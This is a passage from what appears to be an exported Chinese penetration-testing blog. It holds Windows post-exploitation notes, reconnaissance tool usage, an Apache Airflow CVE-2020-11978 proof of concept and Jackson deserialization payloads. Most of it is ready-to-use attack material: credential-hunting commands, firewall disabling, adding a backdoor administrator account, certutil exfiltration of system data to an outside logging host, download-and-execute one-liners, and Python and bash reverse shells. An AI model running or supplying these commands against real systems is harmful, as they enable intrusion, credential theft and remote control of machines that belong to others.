C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.xml) do @findstr &quot;pass&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.config) do @findstr &quot;pass&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">for &#x2F;R %pwd% %%i in (*.conf) do @findstr &quot;pass&#x3D;&quot; &quot;%%i&quot; &amp;&amp; @echo %%i &gt;&gt; C:&#x2F;temp&#x2F;1.txt</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
<p>还可以用下面的方式（抄的）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 查看 Windows 文件</span><br><span class="line">1）WDS</span><br><span class="line">Windows Deployment Services (Windows 部署服务，简称：WDS)，是提供给计算机管理员再企业或组织环境中为计算机部署操作系统的一种工具。</span><br><span class="line">通过 WDS 我们可以轻松地为客户端批量部署操作系统，并可管理影响和无人参与安装脚本，或提供需人参与和无人参与的安装选项。如：通过网络为一台计算机执行需要人参与或无人参与的系统安装过程；映像捕获计算机系统并将其部署到其他计算机上，而不受 HAL 的影响。</span><br><span class="line">但它存在一个问题，就是本地管理员密码以明文形式或 base64 编码存储在诸如以下位置：</span><br><span class="line">C:\unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend.xml</span><br><span class="line">C:\Windows\Panther\Unattend\Unattend.xml</span><br><span class="line">C:\Windows\System32\sysprep.inf</span><br><span class="line">C:\Windows\System32\sysprep\sysprep.xml</span><br><span class="line">有一个 MSF 的模块可以通过其搜寻凭证（msf没找到不知道为啥）</span><br><span class="line"></span><br><span class="line">2）IIS服务器</span><br><span class="line">如果系统是采用 IIS 服务器部署的，可以看看 web.config ，因为它也可能以明文形式包含管理员密码。它本地文件地址通常如下：</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</span><br><span class="line">C:\inetpub\wwwroot\web.config</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2. 命令搜索关键字</span><br><span class="line"></span><br><span class="line">4）注册表里查找关键字</span><br><span class="line">reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br><span class="line">reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br><span class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span><br><span class="line">reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</span><br><span class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span><br><span class="line">reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 &#x2F;v password</span><br><span class="line">5）查找可写目录</span><br><span class="line">dir &#x2F;a-r-d &#x2F;s &#x2F;b</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3. PowerSploit</span><br><span class="line">PowerSploit 有些模块可以检查各种文件和注册表中的凭据。</span><br><span class="line">Get-UnattendedInstallFile</span><br><span class="line">Get-Webconfig</span><br><span class="line">Get-ApplicationHost</span><br><span class="line">Get-SiteListPassword</span><br><span class="line">Get-CachedGPPPassword</span><br><span class="line">Get-RegistryAutoLogon</span><br></pre></td></tr></table></figure>
<p>其他密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir &#x2F;s &#x2F;a \域控IP\SYSVOL*.xml # 获取域里面所有机子的本地管理员账号密码</span><br><span class="line"></span><br><span class="line">netsh wlan show profiles # 查看连接过的wifi名称</span><br><span class="line"></span><br><span class="line">netsh wlan show profile name&#x3D;&quot;wifi名称&quot; key&#x3D;clear # 查看wifi的密码</span><br><span class="line"></span><br><span class="line">dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials* # 查看RDP连接凭证</span><br><span class="line"></span><br><span class="line">laZagne.exe all -oN # 本地wifi&#x2F;浏览器等密码</span><br><span class="line"></span><br><span class="line">dir %APPDATA%\Microsoft\Windows\Recent # 查看最近打开的文档</span><br></pre></td></tr></table></figure>
<h2 id="关防火墙"><a href="#关防火墙" class="headerlink" title="关防火墙"></a>关防火墙</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure>
<h2 id="命令外带"><a href="#命令外带" class="headerlink" title="命令外带"></a>命令外带</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;c &quot;ipconfig &gt; abcde &amp;&amp; set &#x2F;p xx&#x3D;&lt;abcde &amp;&amp; certutil -urlcache -split -f http:&#x2F;&#x2F;hrgjkb.ceye.io?a&#x3D;%xx%</span><br><span class="line"></span><br><span class="line">cmd &#x2F;c &#x2F;v &quot;ipconfig &gt; abcde &amp;&amp; set &#x2F;p xx&#x3D;&lt;abcde &amp;&amp; certutil -urlcache -split -f http:&#x2F;&#x2F;hrgjkb.ceye.io?a&#x3D;!xx!</span><br></pre></td></tr></table></figure>
<h2 id="RDP相关"><a href="#RDP相关" class="headerlink" title="RDP相关"></a>RDP相关</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">开启</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br><span class="line">查端口</span><br><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp &#x2F;v PortNumber</span><br></pre></td></tr></table></figure>
<h2 id="新建用户相关"><a href="#新建用户相关" class="headerlink" title="新建用户相关"></a>新建用户相关</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user wocaini Wocaini121.. &#x2F;add</span><br><span class="line"></span><br><span class="line">加入管理员组</span><br><span class="line">net localgroup administrators wocaini &#x2F;add</span><br><span class="line"></span><br><span class="line"> 加入远程桌面用户组</span><br><span class="line">net localgroup &quot;remote desktop users&quot; wocaini &#x2F;add</span><br></pre></td></tr></table></figure>
<h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Pcalua -a \\x.x.x.x\777.exe</span><br><span class="line">cmd &#x2F;c certutil -urlcache -split -f http:&#x2F;&#x2F;x.x.x.x&#x2F;%USERNAME%+%COMPUTERNAME%+%HOMEPATH%</span><br><span class="line">bitsadmin &#x2F;transfer myDownLoadJob &#x2F;download &#x2F;priority normal http:&#x2F;&#x2F;x.x.x.x c:\temp\777.exe</span><br><span class="line">powershell Start-BitsTransfer -Source &quot;http:&#x2F;&#x2F;10.0.2.21&#x2F;pentestlab.exe&quot; -Destination &quot;C:\tmp\pentestlab.exe&quot;</span><br><span class="line">mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script: http:&#x2F;&#x2F;x.x.x.x&#x2F;hacktest&quot;&quot;)&quot;))</span><br><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;x.x.x.x&#x2F;key.txt payload</span><br><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;webserver&#x2F;payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.dll &amp; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil &#x2F;logfile&#x3D; &#x2F;LogToConsole&#x3D;false &#x2F;u payload.dll</span><br><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;webserver&#x2F;payload.b64 payload.b64 &amp; certutil -decode payload.b64 payload.exe &amp; payload.exe</span><br><span class="line">powershell &quot;Import-Module BitsTransfer;start-bitstransfer http:&#x2F;&#x2F;uee.me&#x2F;crAJs cd.bat&quot;|cd.bat</span><br></pre></td></tr></table></figure>
<h2 id="网络探测"><a href="#网络探测" class="headerlink" title="网络探测"></a>网络探测</h2><p>改进了一下网上的脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rem a段探测</span><br><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">rem 修改ip的值以指定a段</span><br><span class="line"></span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line"></span><br><span class="line">set ip&#x3D;10</span><br><span class="line"></span><br><span class="line">for &#x2F;l %%i in (0,1,255) do (</span><br><span class="line"></span><br><span class="line">for &#x2F;l %%k in (0,1,255) do (</span><br><span class="line"></span><br><span class="line">for %%j in (1,254) do ( @ping %ip%.%%i.%%k.%%j -w 1 -n 1|find &#x2F;i &quot;ttl&#x3D;&quot; &gt;&gt; null</span><br><span class="line">if !errorlevel! equ 0 (echo %ip%.%%i.%%k.%%j is alive ! &gt;&gt; ascan.txt ) else (echo %ip%.%%i.%%k.%%j May be not exist ! )</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rem b段探测</span><br><span class="line">@echo off</span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line"></span><br><span class="line">set ip&#x3D;192.168</span><br><span class="line"></span><br><span class="line">for &#x2F;l %%i in (0,1,255) do (</span><br><span class="line"></span><br><span class="line">for %%k in (1,254) do ( @ping %ip%.%%i.%%k -w 1 -n 1|find &#x2F;i &quot;ttl&#x3D;&quot; &gt;&gt; null</span><br><span class="line">if !errorlevel! equ 0 (echo %ip%.%%i.%%k is alive ! &gt;&gt; bscan.txt ) else (echo %ip%.%%i.%%k May be not exist ! )</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rem c段探测</span><br><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line"></span><br><span class="line">set ip&#x3D;192.168.148</span><br><span class="line"></span><br><span class="line">for &#x2F;l %%k in (0,1,254) do  (</span><br><span class="line">@ping %ip%.%%k -w 1 -n 1| findstr &quot;TTL&#x3D;&quot; &gt;nul</span><br><span class="line">if !errorlevel! equ 0 (echo %ip%.%%k is alive ! &gt;&gt; cscan.txt ) else (echo %ip%.%%k May be not exist ! )</span><br><span class="line">)</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
<h2 id="以上"><a href="#以上" class="headerlink" title="以上"></a>以上</h2>]]></content>
      <categories>
        <category>信息搜集</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Web的信息搜集</title>
    <url>/2021/01/14/Web%E7%9A%84%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<p><em>Web的信息搜集也很重要</em><a id="more"></a></p>
<p>记录一下自己常用的工具，不多。整一堆乱七八糟的信息搜集工具，真正上了的时候到底用哪个呢？</p>
<h1 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h1><h2 id="DomainNamePredictor"><a href="#DomainNamePredictor" class="headerlink" title="DomainNamePredictor"></a>DomainNamePredictor</h2><p>LandGrey写的的一款新工具，可以理解为强域名探测工具</p>
<p><a href="https://github.com/LandGrey/domainNamePredictor">https://github.com/LandGrey/domainNamePredictor</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python dnp.py -d A.com</span><br><span class="line">python dnp.py -f A.com-domains.txt -m simple</span><br><span class="line">python dnp.py -d demo.A.com -m simple -o &#x2F;tmp&#x2F;predictor-a.com.txt</span><br></pre></td></tr></table></figure>
<h2 id="kSubDomain"><a href="#kSubDomain" class="headerlink" title="kSubDomain"></a>kSubDomain</h2><p>知道创宇404团队写的的子域名爆破工具，可用来爆破三级、四级域名</p>
<p><a href="https://github.com/knownsec/ksubdomain">https://github.com/knownsec/ksubdomain</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用内置字典爆破</span><br><span class="line">ksubdomain -d seebug.org</span><br><span class="line"></span><br><span class="line">使用字典爆破域名</span><br><span class="line">ksubdomain -d seebug.org -f subdomains.dict</span><br><span class="line"></span><br><span class="line">字典里都是域名，可使用验证模式</span><br><span class="line">ksubdomain -f dns.txt -verify</span><br><span class="line"></span><br><span class="line">爆破三级域名</span><br><span class="line">ksubdomain -d seebug.org -l 2</span><br><span class="line"></span><br><span class="line">通过管道爆破</span><br><span class="line">echo &quot;seebug.org&quot;|ksubdomain</span><br><span class="line"></span><br><span class="line">通过管道验证域名</span><br><span class="line">echo &quot;paper.seebug.org&quot;|ksubdomain -verify</span><br><span class="line"></span><br><span class="line">仅使用网络API接口获取域名</span><br><span class="line">ksubdomain -d seebug.org -api</span><br><span class="line"></span><br><span class="line">完整模式,先使用网络API，在此基础使用内置字典进行爆破</span><br><span class="line">ksubdomain -d seebug.org -full</span><br></pre></td></tr></table></figure>
<h2 id="OneForAll"><a href="#OneForAll" class="headerlink" title="OneForAll"></a>OneForAll</h2><p>多功能集一体的子域名查询/爆破工具，一定要改配置文件添加上自己的各种接口，改了才好用</p>
<p><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p>
<p>一句话运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python OneForAll.py --target xx.com run</span><br></pre></td></tr></table></figure>
<h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><h2 id="AssetsHunter"><a href="#AssetsHunter" class="headerlink" title="AssetsHunter"></a>AssetsHunter</h2><p>一款快速优秀的探测/爆破工具</p>
<p><a href="https://github.com/rabbitmask/AssetsHunter">https://github.com/rabbitmask/AssetsHunter</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis爆破：</span><br><span class="line">python AssetsHunter.py -redisc 127.0.0.1 -p 6379 -l 1</span><br><span class="line">mysql爆破：</span><br><span class="line">python AssetsHunter.py -mysqlc 127.0.0.1 -u root -p 3306 -l 1</span><br><span class="line">ftp爆破：</span><br><span class="line">python AssetsHunter.py -ftpc 127.0.0.1 -p 21 -u rabbit -l 1</span><br><span class="line">ssh爆破：</span><br><span class="line">python AssetsHunter.py -sshc 127.0.0.1 -p 22 -u root -l 1</span><br><span class="line">信息泄露探测：</span><br><span class="line">python AssetsHunter.py -inforisk http:&#x2F;&#x2F;127.0.0.1</span><br><span class="line">whatcms</span><br><span class="line">python AssetsHunter.py -whatcms http:&#x2F;&#x2F;127.0.0.1</span><br><span class="line">C段探测</span><br><span class="line">python AssetsHunter.py -hawkeye 192.168.1.0&#x2F;24</span><br></pre></td></tr></table></figure>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>这还说什么呢？打！</p>
<p>masscan并不好用</p>
<h2 id="Wfuzz"><a href="#Wfuzz" class="headerlink" title="Wfuzz"></a>Wfuzz</h2><p>Wfuzz其实可以用来跑端口，很简单暴力。对于某些有奇葩防护，开了虚假全端口的站，有奇效。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -c -z range,1-65536 --hc 404,403 --hw 0 --req-delay 1 --conn-delay 1 -Z URL</span><br><span class="line">wfuzz -c -z range,8000-9000 --hl 0 --req-delay 1 --conn-delay 1 -Z URL</span><br></pre></td></tr></table></figure>
<p>不管是hc还是sc，hl还是sl，找合适的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--hc&#x2F;hl&#x2F;hw&#x2F;hh N[,N]+ : 以指定的返回码&#x2F;行数&#x2F;字数&#x2F;字符数作为判断条件隐藏返回结果</span><br><span class="line">--sc&#x2F;sl&#x2F;sw&#x2F;sh N[,N]+ : 以指定的返回码&#x2F;行数&#x2F;字数&#x2F;字符数作为判断条件显示返回结果</span><br></pre></td></tr></table></figure>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>其他的就是各种技巧了，比如whois查备案联系人，联系人再反查域名，拿到二级域名后再去查三级域名，三级域名解析后再去C段等等无限人工递归查询。还有单位名称工商注册查询、域名备案号查询之类的，实在不行去企查查、天眼查去查查二级单位什么的。</p>
<h1 id="以上"><a href="#以上" class="headerlink" title="以上"></a>以上</h1>]]></content>
      <categories>
        <category>信息搜集</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Airflow</title>
    <url>/2021/01/14/Apache-Airflow/</url>
    <content><![CDATA[<p><em>Apache-Airflow是Airbnb开源的一款数据流程工具，目前是Apache孵化项目。</em><a id="more"></a></p>
<h1 id="CVE-2020-11978-命令执行"><a href="#CVE-2020-11978-命令执行" class="headerlink" title="CVE-2020-11978-命令执行"></a>CVE-2020-11978-命令执行</h1><p>Apache Airflow 1.10.10及之前版本中的 example DAGs存在操作系统命令注入漏洞。</p>
<p>example_trigger_target_dag</p>
<p><img src="/images/3.png" alt="3"></p>
<p><img src="/images/1.png" alt="1"></p>
<p>检测Poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;&#39;\&quot;;ping s5pjot.dnslog.cn\&quot;;#&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>反弹Poc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;&#39;\&quot;;python -c \&quot;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;x.x.x.x&#39;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;sh&#39;,&#39;-i&#39;])\&quot;;#&quot;&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Apache Airflow</category>
      </categories>
      <tags>
        <tag>Poc</tag>
      </tags>
  </entry>
  <entry>
    <title>Jackson</title>
    <url>/2021/01/15/Jackson/</url>
    <content><![CDATA[<p><em>Jackson 是一个 Java 的用来处理 JSON 格式数据的类库，多为JNDI注入</em>。<a id="more"></a></p>
<h1 id="CVE-2017-17485"><a href="#CVE-2017-17485" class="headerlink" title="CVE-2017-17485"></a>CVE-2017-17485</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;,&quot;http</span><br><span class="line">:&#x2F;&#x2F;远端vps地址&#x2F;spel.xml&quot;]&#125;</span><br><span class="line"></span><br><span class="line">spel.xml</span><br><span class="line">&lt;beans xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&quot;</span><br><span class="line">xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">xsi:schemaLocation&#x3D;&quot;</span><br><span class="line">http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans</span><br><span class="line">http:&#x2F;&#x2F;www.springframework.org&#x2F;schema&#x2F;beans&#x2F;spring-beans.xsd</span><br><span class="line">&quot;&gt;</span><br><span class="line">&lt;bean id&#x3D;&quot;pb&quot; class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;constructor-arg value&#x3D;&quot;calc&quot; &#x2F;&gt;</span><br><span class="line">&lt;property name&#x3D;&quot;whatever&quot; value&#x3D;&quot;#&#123; pb.start() &#125;&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;bean&gt;</span><br><span class="line">&lt;&#x2F;beans&gt;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2017-15095"><a href="#CVE-2017-15095" class="headerlink" title="CVE-2017-15095"></a>CVE-2017-15095</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&#123;&quot;dataSourceName&quot;:&quot;ssiipp&quot;,&quot;autoCommit&quot;:true&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&#123;&quot;dataSourceName&quot;:&quot;ssiipp&quot;, &quot;autoCommit&quot;:true&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&#123;&quot;dataSourceName&quot;:&quot;ssiipp&quot;, &quot;autoCommit&quot;:true&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&#123;&quot;dataSourceName&quot;:&quot;ssiipp&quot;, &quot;autoCommit&quot;:true&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="1-2-45"><a href="#1-2-45" class="headerlink" title="1-2-45"></a>1-2-45</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&#123;&quot;properties&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1-2-68"></a>1-2-68</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&#123;&quot;resourceName&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&#123;&quot;metricRegistry&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&#123;&quot;healthCheckRegistry&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&#123;&quot;jndiNames&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2018-12022"><a href="#CVE-2018-12022" class="headerlink" title="CVE-2018-12022"></a>CVE-2018-12022</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;jodd.db.connection.DataSourceConnectionProvider&quot;,&quot;ssiipp&quot;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2018-12023"><a href="#CVE-2018-12023" class="headerlink" title="CVE-2018-12023"></a>CVE-2018-12023</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;,&#123;&quot;xadataSourceName&quot;:&quot;ssiipp&quot;,&quot;logWriter&quot;:null&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2018-19360"><a href="#CVE-2018-19360" class="headerlink" title="CVE-2018-19360"></a>CVE-2018-19360</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.axis2.transport.jms.JMSOutTransportInfo&quot;, &quot;jms:&#x2F;ssiipp&quot;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2018-19361"><a href="#CVE-2018-19361" class="headerlink" title="CVE-2018-19361"></a>CVE-2018-19361</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.openjpa.ee.JNDIManagedRuntime&quot;,&#123;&quot;transactionManagerName&quot;:&quot;ssiipp&quot;, &quot;rollbackOnly&quot;:null&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2018-5968"><a href="#CVE-2018-5968" class="headerlink" title="CVE-2018-5968"></a>CVE-2018-5968</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.hibernate.jmx.StatisticsService&quot;,&#123;&quot;sessionFactoryJNDIName&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2018-7489"><a href="#CVE-2018-7489" class="headerlink" title="CVE-2018-7489"></a>CVE-2018-7489</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,&#123;&quot;jndiName&quot;:&quot;ssiipp&quot;,&quot;loginTimeout&quot;:0&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-12384"><a href="#CVE-2019-12384" class="headerlink" title="CVE-2019-12384"></a>CVE-2019-12384</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;,&#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;1.1.1.1&#x2F;exp.sql&#39;&quot;&#125;]&#125;</span><br><span class="line"></span><br><span class="line">exp.sql</span><br><span class="line">CREATE ALIAS SHELLEXEC AS $ String shellexec(String cmd) throws java.io.IOException &#123;</span><br><span class="line">        String[] command &#x3D; &#123;&quot;bash&quot;, &quot;-c&quot;, cmd&#125;;</span><br><span class="line">        java.util.Scanner s &#x3D; new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">        return s.hasNext() ? s.next() : &quot;&quot;;  &#125;</span><br><span class="line">$;</span><br><span class="line">CALL SHELLEXEC(&#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.136.129&#x2F;7777 0&gt;&amp;1&#39;)</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-14379"><a href="#CVE-2019-14379" class="headerlink" title="CVE-2019-14379"></a>CVE-2019-14379</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup&quot;,&#123;&quot;properties&quot;:&#123;&quot;jndiName&quot;:&quot;ssiipp&quot;&#125;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-14439"><a href="#CVE-2019-14439" class="headerlink" title="CVE-2019-14439"></a>CVE-2019-14439</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;,&#123;&quot;jndiLocation&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-14540"><a href="#CVE-2019-14540" class="headerlink" title="CVE-2019-14540"></a>CVE-2019-14540</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.zaxxer.hikari.HikariConfig&quot;, &#123;&quot;metricRegistry&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-14892"><a href="#CVE-2019-14892" class="headerlink" title="CVE-2019-14892"></a>CVE-2019-14892</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.commons.configuration.JNDIConfiguration&quot;, &#123;&quot;prefix&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.commons.configuration2.JNDIConfiguration&quot;, &#123;&quot;prefix&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-14893"><a href="#CVE-2019-14893" class="headerlink" title="CVE-2019-14893"></a>CVE-2019-14893</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.xalan.lib.sql.JNDIConnectionPool&quot;,&#123;&quot;jndiPath&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-16335"><a href="#CVE-2019-16335" class="headerlink" title="CVE-2019-16335"></a>CVE-2019-16335</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.zaxxer.hikari.HikariDataSource&quot;, &#123;&quot;metricRegistry&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-16942"><a href="#CVE-2019-16942" class="headerlink" title="CVE-2019-16942"></a>CVE-2019-16942</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;org.apache.commons.dbcp.datasources.SharedPoolDataSource&quot;,&#123;&quot;dataSourceName&quot;: &quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-16943"><a href="#CVE-2019-16943" class="headerlink" title="CVE-2019-16943"></a>CVE-2019-16943</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;param&quot;: [&quot;com.p6spy.engine.spy.P6DataSource&quot;, &#123;&quot;realDataSource&quot;:&quot;ssiipp&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
